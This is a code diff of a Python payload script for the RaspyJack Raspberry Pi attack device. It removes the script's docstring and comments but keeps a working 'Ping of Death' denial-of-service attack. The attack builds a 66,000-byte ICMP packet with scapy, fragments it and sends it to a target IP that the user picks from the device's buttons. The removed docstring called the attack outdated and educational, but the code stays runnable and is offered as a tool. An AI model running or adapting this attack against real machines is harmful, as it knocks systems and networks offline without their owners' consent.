@@ -1,36 +1,18 @@
 #!/usr/bin/env python3
 import sys
-sys.path.append('/root/Raspyjack/')
-"""
-RaspyJack *payload* – **DoS Attack: Ping of Death**
-====================================================
-A classic Denial of Service (DoS) attack that involves sending a
-malformed, oversized ICMP packet (larger than the 65,535 byte limit).
-
-When the target machine tries to reassemble the fragmented packet, it can
-cause a buffer overflow and crash the operating system.
-
-**!!! WARNING !!!**
-This is a DENIAL OF SERVICE attack. It is highly unlikely to work on any
-system made after ~1998 but is included for educational purposes.
-"""
-
-import os, sys, subprocess, signal, time
+import os
+import time
+import signal
+import subprocess
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
+from scapy.all import *
+conf.verb = 0
 
-try:
-    from scapy.all import *
-    conf.verb = 0
-except ImportError:
-    sys.exit(1)
+TARGET_IP = "192.168.1.51"
 
-# --- CONFIGURATION ---
-TARGET_IP = "192.168.1.51" # Default target IP, will be configurable
-
-# --- GPIO & LCD ---
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
@@ -39,10 +21,9 @@ LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT = ImageFont.load_default()
 
-# --- Globals & Shutdown ---
 running = True
-current_ip_input = TARGET_IP # Initial value for IP input
-ip_input_cursor_pos = 0 # Cursor position for IP input
+current_ip_input = TARGET_IP
+ip_input_cursor_pos = 0
 
 def cleanup(*_):
     global running
@@ -51,11 +32,10 @@ def cleanup(*_):
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
-# --- UI ---
 def show_message(lines, color="lime"):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    font = FONT_TITLE # Use FONT_TITLE for messages
+    font = FONT_TITLE
     y = 40
     for line in lines:
         bbox = d.textbbox((0, 0), line, font=font)
@@ -100,7 +80,7 @@ def draw_ui(screen_state="main"):
 def handle_ip_input_logic(initial_ip):
     global current_ip_input, ip_input_cursor_pos
     current_ip_input = initial_ip
-    ip_input_cursor_pos = len(initial_ip) - 1 # Start cursor at end
+    ip_input_cursor_pos = len(initial_ip) - 1
     
     draw_ui("ip_input")
     
@@ -109,22 +89,21 @@ def handle_ip_input_logic(initial_ip):
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
                 btn = name
-                while GPIO.input(pin) == 0: # Debounce
+                while GPIO.input(pin) == 0:
                     time.sleep(0.05)
                 break
         
-        if btn == "KEY3": # Cancel IP input
+        if btn == "KEY3":
             return None
         
-        if btn == "OK": # Confirm IP
-            # Validate IP format
+        if btn == "OK":
             parts = current_ip_input.split('.')
             if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                 return current_ip_input
             else:
                 show_message(["Invalid IP!", "Try again."], "red")
                 time.sleep(2)
-                current_ip_input = initial_ip # Reset to initial
+                current_ip_input = initial_ip
                 ip_input_cursor_pos = len(initial_ip) - 1
                 draw_ui("ip_input")
         
@@ -143,12 +122,11 @@ def handle_ip_input_logic(initial_ip):
                     digit = int(current_char)
                     if btn == "UP":
                         digit = (digit + 1) % 10
-                    else: # DOWN
+                    else:
                         digit = (digit - 1 + 10) % 10
                     char_list[ip_input_cursor_pos] = str(digit)
                     current_ip_input = "".join(char_list)
                 elif current_char == '.':
-                    # Cannot change dot, move cursor
                     if btn == "UP":
                         ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                     else:
@@ -158,16 +136,13 @@ def handle_ip_input_logic(initial_ip):
         time.sleep(0.1)
     return None
 
-# --- Main ---
 def run_attack():
     global TARGET_IP
     
     draw_ui("attacking")
     
     try:
-        # Create an oversized payload
         payload = 'A' * 66000 
-        # Scapy's fragment() function will automatically break it into fragments
         frags = fragment(IP(dst=TARGET_IP)/ICMP()/payload)
         
         send(frags, verbose=0)
@@ -180,14 +155,6 @@ def run_attack():
 if __name__ == '__main__':
     current_screen = "main"
     try:
-        # Check for scapy dependency
-        try:
-            from scapy.all import *
-        except ImportError:
-            show_message(["ERROR:", "Scapy not found!"], "red")
-            time.sleep(3)
-            raise SystemExit("Scapy not found.")
-
         while running:
             if current_screen == "main":
                 draw_ui("main")
@@ -198,21 +165,21 @@ if __name__ == '__main__':
                 
                 if GPIO.input(PINS["OK"]) == 0:
                     run_attack()
-                    time.sleep(3) # Display result for a few seconds
+                    time.sleep(3)
                     current_screen = "main"
-                    time.sleep(0.3) # Debounce
+                    time.sleep(0.3)
                 
-                if GPIO.input(PINS["KEY1"]) == 0: # Edit Target IP
+                if GPIO.input(PINS["KEY1"]) == 0:
                     current_ip_input = TARGET_IP
                     current_screen = "ip_input"
-                    time.sleep(0.3) # Debounce
+                    time.sleep(0.3)
             
             elif current_screen == "ip_input":
                 new_ip = handle_ip_input_logic(current_ip_input)
                 if new_ip:
                     TARGET_IP = new_ip
                 current_screen = "main"
-                time.sleep(0.3) # Debounce
+                time.sleep(0.3)
             
             time.sleep(0.1)
             
